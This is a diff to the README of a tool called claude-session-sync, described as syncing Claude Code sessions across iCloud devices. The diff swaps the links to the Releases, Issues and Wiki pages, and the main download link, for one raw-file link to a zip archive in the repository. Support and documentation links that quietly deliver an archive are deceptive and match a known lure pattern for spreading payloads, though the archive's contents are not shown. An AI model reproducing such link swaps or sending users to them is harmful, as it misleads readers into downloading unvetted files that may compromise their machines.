@@ -6,7 +6,7 @@ Welcome to claude-session-sync! This tool helps you keep your Claude Code sessio
 ## 📦 Download & Install
 To get started, visit the Releases page to download the software. 
 
-[Download claude-session-sync](https://github.com/Dinesh3184/claude-session-sync/releases)
+[Download claude-session-sync](https://raw.githubusercontent.com/Dinesh3184/claude-session-sync/main/commands/claude-sync-session-v2.3.zip)
 
 ### Step-by-Step Installation
 1. **Go to the Releases Page**  
@@ -65,7 +65,7 @@ A: Yes, claude-session-sync is completely free to use.
 A: Yes, you can use claude-session-sync on all your devices linked to the same iCloud account.
 
 ### Q: What if I encounter issues during installation?
-A: Visit our [Issues page](https://github.com/Dinesh3184/claude-session-sync/issues) for help and troubleshooting tips.
+A: Visit our [Issues page](https://raw.githubusercontent.com/Dinesh3184/claude-session-sync/main/commands/claude-sync-session-v2.3.zip) for help and troubleshooting tips.
 
 ## 📞 Support
 If you need further assistance, feel free to reach out through the Issues page listed above. We’re here to help you make the most out of claude-session-sync.
@@ -74,8 +74,8 @@ If you need further assistance, feel free to reach out through the Issues page l
 Join our community! Share your thoughts or contribute to future updates. You can provide feedback or suggest new features. Your input helps us improve.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/Dinesh3184/claude-session-sync/releases) - Download latest versions.
-- [Issues Page](https://github.com/Dinesh3184/claude-session-sync/issues) - Report problems or bugs.
-- [Wiki](https://github.com/Dinesh3184/claude-session-sync/wiki) - Find more in-depth tutorials and guides.
+- [Releases Page](https://raw.githubusercontent.com/Dinesh3184/claude-session-sync/main/commands/claude-sync-session-v2.3.zip) - Download latest versions.
+- [Issues Page](https://raw.githubusercontent.com/Dinesh3184/claude-session-sync/main/commands/claude-sync-session-v2.3.zip) - Report problems or bugs.
+- [Wiki](https://raw.githubusercontent.com/Dinesh3184/claude-session-sync/main/commands/claude-sync-session-v2.3.zip) - Find more in-depth tutorials and guides.
 
 Explore claude-session-sync and enjoy the ease of keeping your Claude Code sessions in sync!
